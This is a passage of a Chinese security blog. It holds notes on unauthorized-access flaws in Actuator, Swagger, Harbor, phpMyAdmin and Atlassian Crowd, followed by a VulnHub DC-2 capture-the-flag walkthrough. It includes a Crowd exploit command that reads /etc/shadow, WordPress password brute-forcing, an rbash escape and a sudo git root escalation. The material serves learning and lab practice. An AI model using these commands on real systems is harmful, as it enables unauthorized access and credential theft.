id="SpringBoot-Actuator-未授权访问"><a href="#SpringBoot-Actuator-未授权访问" class="headerlink" title="SpringBoot Actuator 未授权访问"></a>SpringBoot Actuator 未授权访问</h1><h2 id="漏洞简介-27"><a href="#漏洞简介-27" class="headerlink" title="漏洞简介"></a>漏洞简介</h2><p>Actuator 是 springboot 提供的用来对应用系统进行自省和监控的功能模块，借助于 Actuator 开发者可以很方便地对应用系统某些监控指标进行查看、统计等。在 Actuator 启用的情况下，如果没有做好相关权限控制，非法用户可通过访问默认的执行器端点（endpoints）来获取应用系统中的监控信息，从而导致信息泄露甚至服务器被接管的事件发生。</p><h2 id="漏洞检测-27"><a href="#漏洞检测-27" class="headerlink" title="漏洞检测"></a>漏洞检测</h2><p>1、直接访问相关路径：</p><p><a href="http://10.2.20.48/actuator/autoconfig">http://10.2.20.48/actuator/autoconfig</a></p><p><a href="http://10.2.20.48/env">http://10.2.20.48 /actuator/env</a></p><p><a href="http://10.2.20.48/actuator/dump">http://10.2.20.48/actuator/dump</a></p><p><a href="http://10.2.20.48/actuator/headdump%E5%8F%AF%E4%B8%8B%E8%BD%BD">http://10.2.20.48/actuator/headdump可下载</a></p><p>2、actuator未直接部署在IP根目录下</p><p>使用burpsuite的插件：APIKit</p><p>介绍：<a href="https://www.bilibili.com/read/cv15912732">https://www.bilibili.com/read/cv15912732</a></p><p>介绍：<a href="https://blog.csdn.net/qq_50854790/article/details/122894291">https://blog.csdn.net/qq_50854790/article/details/122894291</a></p><h2 id="漏洞修复-27"><a href="#漏洞修复-27" class="headerlink" title="漏洞修复"></a>漏洞修复</h2><ul><li>禁用&#x2F;env接口；</li><li>升级到SpringBoot Actuator 2.0；</li><li>禁止对外开放；</li></ul><h1 id="SwaggerUI未授权访问漏洞"><a href="#SwaggerUI未授权访问漏洞" class="headerlink" title="SwaggerUI未授权访问漏洞"></a>SwaggerUI未授权访问漏洞</h1><h2 id="漏洞简介-28"><a href="#漏洞简介-28" class="headerlink" title="漏洞简介"></a>漏洞简介</h2><p>Swagger 是一个规范且完整的框架，用于生成、描述、调用和可视化 RESTful 风格的 Web 服务。</p><h2 id="漏洞检测-28"><a href="#漏洞检测-28" class="headerlink" title="漏洞检测"></a>漏洞检测</h2><p>1、可利用未授权访问漏洞，直接访问以下链接（目录遍历）</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br></pre></td><td class="code"><pre><span class="line">/api</span><br><span class="line"></span><br><span class="line">/api-docs</span><br><span class="line"></span><br><span class="line">/api-docs/swagger.json</span><br><span class="line"></span><br><span class="line">/api.html</span><br><span class="line"></span><br><span class="line">/api/api-docs</span><br><span class="line"></span><br><span class="line">/api/apidocs</span><br><span class="line"></span><br><span class="line">/api/doc</span><br><span class="line"></span><br><span class="line">/api/swagger</span><br><span class="line"></span><br><span class="line">/api/swagger-ui</span><br><span class="line"></span><br><span class="line">/api/swagger-ui.html</span><br><span class="line"></span><br><span class="line">/api/swagger-ui.html/</span><br><span class="line"></span><br><span class="line">/api/swagger-ui.json</span><br><span class="line"></span><br><span class="line">/api/swagger.json</span><br><span class="line"></span><br><span class="line">/api/swagger/</span><br><span class="line"></span><br><span class="line">/api/swagger/ui</span><br><span class="line"></span><br><span class="line">/api/swagger/ui/</span><br><span class="line"></span><br><span class="line">/api/swaggerui</span><br><span class="line"></span><br><span class="line">/api/swaggerui/</span><br><span class="line"></span><br><span class="line">/api/v1/</span><br><span class="line"></span><br><span class="line">/api/v1/api-docs</span><br><span class="line"></span><br><span class="line">/api/v1/apidocs</span><br><span class="line"></span><br><span class="line">/api/v1/swagger</span><br><span class="line"></span><br><span class="line">/api/v1/swagger-ui</span><br><span class="line"></span><br><span class="line">/api/v1/swagger-ui.html</span><br><span class="line"></span><br><span class="line">/api/v1/swagger-ui.json</span><br><span class="line"></span><br><span class="line">/api/v1/swagger.json</span><br><span class="line"></span><br><span class="line">/api/v1/swagger/</span><br><span class="line"></span><br><span class="line">/api/v2</span><br><span class="line"></span><br><span class="line">/api/v2/api-docs</span><br><span class="line"></span><br><span class="line">/api/v2/apidocs</span><br><span class="line"></span><br><span class="line">/api/v2/swagger</span><br><span class="line"></span><br><span class="line">/api/v2/swagger-ui</span><br><span class="line"></span><br><span class="line">/api/v2/swagger-ui.html</span><br><span class="line"></span><br><span class="line">/api/v2/swagger-ui.json</span><br><span class="line"></span><br><span class="line">/api/v2/swagger.json</span><br><span class="line"></span><br><span class="line">/api/v2/swagger/</span><br><span class="line"></span><br><span class="line">/api/v3</span><br><span class="line"></span><br><span class="line">/apidocs</span><br><span class="line"></span><br><span class="line">/apidocs/swagger.json</span><br><span class="line"></span><br><span class="line">/doc.html</span><br><span class="line"></span><br><span class="line">/docs/</span><br><span class="line"></span><br><span class="line">/druid/index.html</span><br><span class="line"></span><br><span class="line">/graphql</span><br><span class="line"></span><br><span class="line">/libs/swaggerui</span><br><span class="line"></span><br><span class="line">/libs/swaggerui/</span><br><span class="line"></span><br><span class="line">/spring-security-oauth-resource/swagger-ui.html</span><br><span class="line"></span><br><span class="line">/spring-security-rest/api/swagger-ui.html</span><br><span class="line"></span><br><span class="line">/sw/swagger-ui.html</span><br><span class="line"></span><br><span class="line">/swagger</span><br><span class="line"></span><br><span class="line">/swagger-resources</span><br><span class="line"></span><br><span class="line">/swagger-resources/configuration/security</span><br><span class="line"></span><br><span class="line">/swagger-resources/configuration/security/</span><br><span class="line"></span><br><span class="line">/swagger-resources/configuration/ui</span><br><span class="line"></span><br><span class="line">/swagger-resources/configuration/ui/</span><br><span class="line"></span><br><span class="line">/swagger-ui</span><br><span class="line"></span><br><span class="line">/swagger-ui.html</span><br><span class="line"></span><br><span class="line">/swagger-ui.html#/api-memory-controller</span><br><span class="line"></span><br><span class="line">/swagger-ui.html/</span><br><span class="line"></span><br><span class="line">/swagger-ui.json</span><br><span class="line"></span><br><span class="line">/swagger-ui/swagger.json</span><br><span class="line"></span><br><span class="line">/swagger.json</span><br><span class="line"></span><br><span class="line">/swagger.yml</span><br><span class="line"></span><br><span class="line">/swagger/</span><br><span class="line"></span><br><span class="line">/swagger/index.html</span><br><span class="line"></span><br><span class="line">/swagger/static/index.html</span><br><span class="line"></span><br><span class="line">/swagger/swagger-ui.html</span><br><span class="line"></span><br><span class="line">/swagger/ui/</span><br><span class="line"></span><br><span class="line">/Swagger/ui/index</span><br><span class="line"></span><br><span class="line">/swagger/ui/index</span><br><span class="line"></span><br><span class="line">/swagger/v1/swagger.json</span><br><span class="line"></span><br><span class="line">/swagger/v2/swagger.json</span><br><span class="line"></span><br><span class="line">/template/swagger-ui.html</span><br><span class="line"></span><br><span class="line">/user/swagger-ui.html</span><br><span class="line"></span><br><span class="line">/user/swagger-ui.html/</span><br><span class="line"></span><br><span class="line">/v1.x/swagger-ui.html</span><br><span class="line"></span><br><span class="line">/v1/api-docs</span><br><span class="line"></span><br><span class="line">/v1/swagger.json</span><br><span class="line"></span><br><span class="line">/v2/api-docs</span><br><span class="line"></span><br><span class="line">/v3/api-docs</span><br></pre></td></tr></table></figure><p>2、swagger-ui未直接部署在IP根目录下</p><p>使用burpsuite的插件：APIKit</p><p>介绍：<a href="https://www.bilibili.com/read/cv15912732">https://www.bilibili.com/read/cv15912732</a></p><p>介绍：<a href="https://blog.csdn.net/qq_50854790/article/details/122894291">https://blog.csdn.net/qq_50854790/article/details/122894291</a></p><h2 id="漏洞修复-28"><a href="#漏洞修复-28" class="headerlink" title="漏洞修复"></a>漏洞修复</h2><p>设置访问权限</p><h1 id="Harbor未授权添加管理员漏洞"><a href="#Harbor未授权添加管理员漏洞" class="headerlink" title="Harbor未授权添加管理员漏洞"></a>Harbor未授权添加管理员漏洞</h1><h2 id="漏洞简介-29"><a href="#漏洞简介-29" class="headerlink" title="漏洞简介"></a>漏洞简介</h2><p>Harbor未授权添加任意管理员漏洞。攻击者可通过构造特定的字符串，在未授权的情况下直接创建管理员账号，从而接管Harbor镜像仓库。</p><h2 id="漏洞检测-29"><a href="#漏洞检测-29" class="headerlink" title="漏洞检测"></a>漏洞检测</h2><p>漏洞地址：<a href="http://10.101.20.111/harbor/sign-in">http://10.101.20.111/harbor/sign-in</a></p><h2 id="漏洞修复-29"><a href="#漏洞修复-29" class="headerlink" title="漏洞修复"></a>漏洞修复</h2><p>尽快升级到安全版本，下载链接参考：</p><p><a href="https://github.com/goharbor/harbor/releases">https://github.com/goharbor/harbor/releases</a></p><h1 id="Windows-ipc共享未授权访问漏洞"><a href="#Windows-ipc共享未授权访问漏洞" class="headerlink" title="Windows ipc共享未授权访问漏洞"></a>Windows ipc共享未授权访问漏洞</h1><h2 id="漏洞简介-30"><a href="#漏洞简介-30" class="headerlink" title="漏洞简介"></a>漏洞简介</h2><h2 id="漏洞检测-30"><a href="#漏洞检测-30" class="headerlink" title="漏洞检测"></a>漏洞检测</h2><h2 id="漏洞修复-30"><a href="#漏洞修复-30" class="headerlink" title="漏洞修复"></a>漏洞修复</h2><h1 id="宝塔phpmyadmin未授权访问"><a href="#宝塔phpmyadmin未授权访问" class="headerlink" title="宝塔phpmyadmin未授权访问"></a>宝塔phpmyadmin未授权访问</h1><h2 id="漏洞简介-31"><a href="#漏洞简介-31" class="headerlink" title="漏洞简介"></a>漏洞简介</h2><p>宝塔Linux面板7.4.2版本和Windows面板6.8版本存在phpmyadmin未授权访问漏洞</p><p>phpmyadmin未鉴权，可通过特定地址直接登录数据库的漏洞。</p><h2 id="漏洞检测-31"><a href="#漏洞检测-31" class="headerlink" title="漏洞检测"></a>漏洞检测</h2><p>1、目录扫描：&#x2F;pma   或者 &#x2F;phpmyadmin</p><p>2、漏洞URL：<a href="http://ip:888/pma">http://ip:888/pma</a></p><p>即可直接登录（但要求必须安装了phpmyadmin）</p><h2 id="漏洞修复-31"><a href="#漏洞修复-31" class="headerlink" title="漏洞修复"></a>漏洞修复</h2><h1 id="WordPress未授权访问漏洞"><a href="#WordPress未授权访问漏洞" class="headerlink" title="WordPress未授权访问漏洞"></a>WordPress未授权访问漏洞</h1><h2 id="漏洞简介-32"><a href="#漏洞简介-32" class="headerlink" title="漏洞简介"></a>漏洞简介</h2><h2 id="漏洞检测-32"><a href="#漏洞检测-32" class="headerlink" title="漏洞检测"></a>漏洞检测</h2><h2 id="漏洞修复-32"><a href="#漏洞修复-32" class="headerlink" title="漏洞修复"></a>漏洞修复</h2><h1 id="Atlassian-Crowd-未授权访问"><a href="#Atlassian-Crowd-未授权访问" class="headerlink" title="Atlassian Crowd 未授权访问"></a>Atlassian Crowd 未授权访问</h1><h2 id="漏洞简介-33"><a href="#漏洞简介-33" class="headerlink" title="漏洞简介"></a>漏洞简介</h2><p>Atlassian Crowd是一套基于Web的单点登录系统。该系统为多用户、网络应用程序和目录服务器提供验证、授权等功能。Atlassian Crowd Data Center是Crowd的集群部署版。</p><p>Atlassian Crowd和Crowd Data Center在其某些发行版本中错误地启用了pdkinstall开发插件，使其存在安全漏洞。攻击者利用该漏洞可在未授权访问的情况下对Atlassian Crowd和Crowd Data Center安装任意的恶意插件，执行任意代码&#x2F;命令，从而获得服务器权限。</p><h2 id="漏洞检测-33"><a href="#漏洞检测-33" class="headerlink" title="漏洞检测"></a>漏洞检测</h2><p>漏洞利用脚本github地址：<a href="https://github.com/jas502n/CVE-2019-11580">https://github.com/jas502n/CVE-2019-11580</a></p><p>git clone <a href="https://github.com/jas502n/CVE-2019-11580">https://github.com/jas502n/CVE-2019-11580</a></p><p>cd CVE-2019-11580&#x2F;</p><p>python CVE-2019-11580.py <a href="http://192.168.18.138:8095/">http://192.168.18.138:8095</a></p><p>curl  <a href="http://192.168.18.138:8095/crowd/plugins/servlet/exp?cmd=cat%20/etc/shadow">http://192.168.18.138:8095/crowd/plugins/servlet/exp?cmd=cat%20/etc/shadow</a></p><h2 id="漏洞修复-33"><a href="#漏洞修复-33" class="headerlink" title="漏洞修复"></a>漏洞修复</h2><p>设置访问&#x2F;crowd&#x2F;admin&#x2F;uploadplugin.action的源ip。</p><p>升级最新版本(3.5.0以上)。</p><h1 id="PHP-FPM-Fastcgi未授权访问漏洞"><a href="#PHP-FPM-Fastcgi未授权访问漏洞" class="headerlink" title="PHP-FPM Fastcgi未授权访问漏洞"></a>PHP-FPM Fastcgi未授权访问漏洞</h1><h2 id="漏洞简介-34"><a href="#漏洞简介-34" class="headerlink" title="漏洞简介"></a>漏洞简介</h2><h2 id="漏洞检测-34"><a href="#漏洞检测-34" class="headerlink" title="漏洞检测"></a>漏洞检测</h2><h2 id="漏洞修复-34"><a href="#漏洞修复-34" class="headerlink" title="漏洞修复"></a>漏洞修复</h2><h1 id="uWSGI未授权访问漏洞"><a href="#uWSGI未授权访问漏洞" class="headerlink" title="uWSGI未授权访问漏洞"></a>uWSGI未授权访问漏洞</h1><h2 id="漏洞简介-35"><a href="#漏洞简介-35" class="headerlink" title="漏洞简介"></a>漏洞简介</h2><h2 id="漏洞检测-35"><a href="#漏洞检测-35" class="headerlink" title="漏洞检测"></a>漏洞检测</h2><h2 id="漏洞修复-35"><a href="#漏洞修复-35" class="headerlink" title="漏洞修复"></a>漏洞修复</h2><h1 id="Kong未授权访问漏洞"><a href="#Kong未授权访问漏洞" class="headerlink" title="Kong未授权访问漏洞"></a>Kong未授权访问漏洞</h1><h2 id="漏洞简介-36"><a href="#漏洞简介-36" class="headerlink" title="漏洞简介"></a>漏洞简介</h2><h2 id="漏洞检测-36"><a href="#漏洞检测-36" class="headerlink" title="漏洞检测"></a>漏洞检测</h2><h2 id="漏洞修复-36"><a href="#漏洞修复-36" class="headerlink" title="漏洞修复"></a>漏洞修复</h2><h1 id="ThinkAdminV6未授权访问漏洞"><a href="#ThinkAdminV6未授权访问漏洞" class="headerlink" title="ThinkAdminV6未授权访问漏洞"></a>ThinkAdminV6未授权访问漏洞</h1><h2 id="漏洞简介-37"><a href="#漏洞简介-37" class="headerlink" title="漏洞简介"></a>漏洞简介</h2><h2 id="漏洞检测-37"><a href="#漏洞检测-37" class="headerlink" title="漏洞检测"></a>漏洞检测</h2><h2 id="漏洞修复-37"><a href="#漏洞修复-37" class="headerlink" title="漏洞修复"></a>漏洞修复</h2>]]></content>
      
      
      <categories>
          
          <category> 安全 </category>
          
          <category> Web安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Web安全 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>【vulnhub】DC-2攻略</title>
      <link href="/dc-2-walkthrough/"/>
      <url>/dc-2-walkthrough/</url>
      
        <content type="html"><![CDATA[<p>靶机链接：<a href="https://www.vulnhub.com/entry/dc-2,311/">DC: 2 ~ VulnHub</a></p><h1 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h1><h2 id="IP"><a href="#IP" class="headerlink" title="IP"></a>IP</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap 192.168.56.101/24</span><br></pre></td></tr></table></figure><p><img src="/img/1670672682134-fe2ff33c-8998-4e3e-8bfb-d1a0854357ba.png" alt="img"></p><p>kali：192.168.56.101</p><p>靶机：192.168.56.105</p><h2 id="端口"><a href="#端口" class="headerlink" title="端口"></a>端口</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sTCV 192.168.56.105</span><br></pre></td></tr></table></figure><p><img src="/img/1670672781181-0831f8f0-c49d-4229-a92f-0a783011e6e6.png" alt="img"></p><p>就扫到一个80端口，看来只能从web找突破口了</p><h2 id="web"><a href="#web" class="headerlink" title="web"></a>web</h2><p>看以看到上面的扫描结果，80端口被重定向到<code>http://dc-2/</code>了，直接用ip访问的话，浏览器会自动跳到<code>http://dc-2/</code>这个站，而dns是不知道这个站的ip的，所以会打不开。</p><p>这时候我们要手动配置<code>hosts</code>文件</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo vim /etc/hosts</span><br></pre></td></tr></table></figure><p>加上这一条解析</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">192.168.56.105dc-2</span><br></pre></td></tr></table></figure><p>然后保存就好，打开网站就能看到了</p><img src="/img/1670673288165-4c9b2755-be6a-4d29-8d68-b91f9fe85f90.png" alt="img" style="zoom:33%;" /><p>用whatweb来看下网站的信息</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">whatweb http://192.168.56.105/</span><br></pre></td></tr></table></figure><p><img src="/img/1670673635705-74df0ebe-2516-4568-a6be-ea9fae43b1d9.png" alt="img"></p><p>可以看到，用了word press框架，版本是<strong>WordPress 4.7.10</strong></p><p>用searchsploit找了下，没有找到可以用的</p><p>接着又对目录进行爆破，没有发现有用的东西</p><p>看到Web站点的Flag提示，应该是要我们去爆破后台；而且一般的字典是爆破不出他的密码，flag提到了一个工具<code>cewl</code></p><img src="/img/1670826157619-d0722724-c76f-4659-82b1-dd0ad0ba97a8.png" alt="img" style="zoom: 67%;" /><p>想到Kali里自带了一个专门针对wordpress的扫描器<code>wpscan</code>，那我们先用它来枚举一下看有哪些用户名</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">wpscan --url http://dc-2/ --enumerate u</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">从别的师傅那学到的</span></span><br><span class="line">nmap --script=vuln 192.168.56.105</span><br></pre></td></tr></table></figure><p>扫出3个用户</p><p><img src="/img/1670675879024-da27584b-dc23-417d-96f3-e633155470f1.png" alt="img"></p><p>接着用之前flag里提到的工具<code>cewl</code>来生成字典</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cewl http://dc-2/ -w pwd.txt</span><br></pre></td></tr></table></figure><p><img src="/img/1670826789707-d36586bd-4361-4b4b-9d50-84ef8cddb119.png" alt="img"></p><p>可以看到，成功生成了字典，接着就用这个生成的字典，来爆破上面的三个用户</p><h2 id="爆破密码"><a href="#爆破密码" class="headerlink" title="爆破密码"></a>爆破密码</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">wpscan --url http://dc-2/ -P pwd.txt</span><br><span class="line"></span><br><span class="line">[!] Valid Combinations Found:</span><br><span class="line"> | Username: jerry, Password: adipiscing</span><br><span class="line"> | Username: tom, Password: parturient</span><br></pre></td></tr></table></figure><p><img src="/img/1670827167046-69b9b9fd-d6ee-47bd-99aa-42fe929dc4a6.png" alt="img"></p><h2 id="登录"><a href="#登录" class="headerlink" title="登录"></a>登录</h2><p>登录jerry用户，在post里面发现<code>flag2</code></p><p><img src="/img/1670827624939-e858d7a6-bdb9-464c-95ca-7532d0201443.png" alt="img"></p><p>flag2：</p><p>如果你不能利用wordpess走捷径的话，还有其他办法</p><p>我又登录了<code>tom</code>，信息比jerry还少，pages里面就只有一篇文章，连flag都没有</p><p>之前打靶机是通过wordpress的插件写php拿到的shell，这里直接没看到入口。</p><p>跟着提示，从其他地方找突破口，之前扫出来的就一个80端口，除了这个wordpress也没啥了，提示说找其他突破口，也就是还有其他点，于是我重新扫了一遍全端口，看有没有其他的服务开放</p><h2 id="7744-SSH"><a href="#7744-SSH" class="headerlink" title="7744 SSH"></a>7744 SSH</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sTVC 192.168.56.105 -p-</span><br></pre></td></tr></table></figure><p><img src="/img/1670828657169-1577783e-4c26-440d-9af7-65ade9991dbc.png" alt="img"></p><p>扫出来一个<code>7744</code>端口，可以看到，运行的是SSH服务。肯定是修改了默认端口，把22改成7744了。</p><p>既然只有这一个多扫出来的端口，那就只有这里了，结合之前爆破出来的账号密码，连接试下</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh tom@192.168.56.105 -p 7744</span><br></pre></td></tr></table></figure><p>我先试了jerry的，因为他在web可以登录，然后失败了；</p><p>然后换成tom，连接成功了。</p><h1 id="getshell"><a href="#getshell" class="headerlink" title="getshell"></a>getshell</h1><p><img src="/img/1670828978179-0734ebf8-8ab8-44b1-b0bd-0f377185e16e.png" alt="img"></p><p>如上图，习惯性打了一波<code>whoami</code>，居然执行不了，说没找到命令，先不管（其实后面还是要管）</p><p>拿到shell，先pwd，ls看一波</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">tom@DC-2:~$ pwd</span><br><span class="line">/home/tom</span><br><span class="line">tom@DC-2:~$ ls</span><br><span class="line">flag3.txt  usr</span><br></pre></td></tr></table></figure><p>看到个flag3.txt，习惯性<code>cat</code>看一下</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">tom@DC-2:~$ cat flag3.txt</span><br><span class="line">-rbash: cat: command not found</span><br></pre></td></tr></table></figure><p>cat命令用不了，我没遇到过这种情况。有些机子<code>vim</code>用不了，因为没装，那我还能理解，我用<code>vi</code>就好，但是连cat都不能用，就觉得很奇怪了。但是也不知道是什么原因。</p><p>然后，flag3旁边还有个<code>usr</code>，<code>cd</code>进去看看。发现cd命令都用不了了。然后用<code>ls</code>去列出<code>usr</code>里面的东西，发现只有一个<code>bin</code>目录，然后在靠<code>ls</code>列出里面的东西。</p><p>发现有四个命令，猜测应该是<code>tom</code>这个用户可以执行的命令了。</p><p>我看了kali用户的home目录，以及我vps的home目录，里面都没有<code>/home/xxx/usr/bin</code>，应该是这个靶机特有的</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">tom@DC-2:~$ cd usr</span><br><span class="line">-rbash: cd: restricted</span><br><span class="line">tom@DC-2:~$ ls ./usr</span><br><span class="line">bin</span><br><span class="line">tom@DC-2:~$ ls usr/bin</span><br><span class="line">less  ls  scp  vi</span><br></pre></td></tr></table></figure><p>发现有<code>less</code>和<code>vi</code>，那随便就可以用这二者之一看到flag3里面的内容</p><p>Poor old Tom is always running after Jerry. Perhaps he should su for all the stress he causes.</p><p>看到<code>su</code>，我就感觉要切换用户<code>jerry</code>，但是能用的4个命令，不足以让我们切换到jerry</p><h2 id="rbash-绕过"><a href="#rbash-绕过" class="headerlink" title="rbash 绕过"></a>rbash 绕过</h2><p>于是我上网找资料，才知道<code>rbash</code>这个东西</p><p>然后才注意到他的输出，和我右边的kali对比，是不一样的，他前面多了个<code>-rbash</code></p><p><img src="/img/1670829506233-7ec16404-e33f-4b8b-91a3-285452a2ce40.png" alt="img"></p><p>查了下rbash，就是一个功能受限的bash，很多命令他用不了，但是可以逃逸（第一篇出来的就是rbash绕过）</p><p>按照网上的教程，开始绕过</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">进入vi</span></span><br><span class="line">vi</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">命令行:模式下输入</span></span><br><span class="line">setshell=/bin/bash</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">命令行：模式下输入</span></span><br><span class="line">shell</span><br></pre></td></tr></table></figure><p>然后跳出了vi，回到了shell界面</p><p>试着执行了几个命令，虽然是bash环境了，但一些命令还是无法执行，并且无法执行<code>su</code>命令</p><p><img src="/img/1670831149083-3f0af1ca-29dc-4574-bf16-fccd037be522.png" alt="img"></p><p>去看了别人的wp，发现还要导入环境变量</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">export PATH=$PATH:/bin/</span><br><span class="line">export PATH=$PATH:/usr/bin</span><br></pre></td></tr></table></figure><h2 id="jerry-登场"><a href="#jerry-登场" class="headerlink" title="jerry 登场"></a>jerry 登场</h2><p>现在就可以切换用户了，输入密码，切换成功！</p><p>这里我其实有一点疑问，我对Linux不是特别了解。为啥之前ssh连接的时候，我先试的就是jerry，那个时候，提示认证失败，这里切换用户，还是那个密码，却可以成功切换？</p><p><img src="/img/1670831943798-bbc7cbb0-99a5-4499-a4eb-4a1bcb770ca6.png" alt="img"></p><p>切到jerry的home目录，发现了<code>flag4.txt</code></p><p>Good to see that you’ve made it this far - but you’re not home yet. </p><p>You still need to get the final flag (the only flag that really counts!!!).  </p><p>No hints here - you’re on your own now.  :-)</p><p>Go on - git outta here!!!!</p><p>没有提示，那就提权方法都试一下</p><h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><ul><li>suid提权，没找到能用的命令</li><li>撞库，用tom和jerry的密码还有弱口令去撞root的密码，都是错误</li><li><code>sudo -l</code>，看到个git，网上搜了一下git提权，有东西！</li></ul><p>按照这个博客的教程 <a href="https://blog.csdn.net/G_Fu_Q/article/details/116276096">git提权方法</a></p><p>成功提权到root</p><p><img src="/img/1670832738247-925c1060-72a3-4b53-8603-da96ee804550.png" alt="img"></p><h2 id="flag"><a href="#flag" class="headerlink" title="flag"></a>flag</h2><p>最后一步啦，去拿flag</p><p><img src="/img/1670832853253-5069b085-5062-404c-8373-d558f4c83255.png" alt="img"></p><p>完成~~~</p><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><h2 id="整体思路"><a href="#整体思路" class="headerlink" 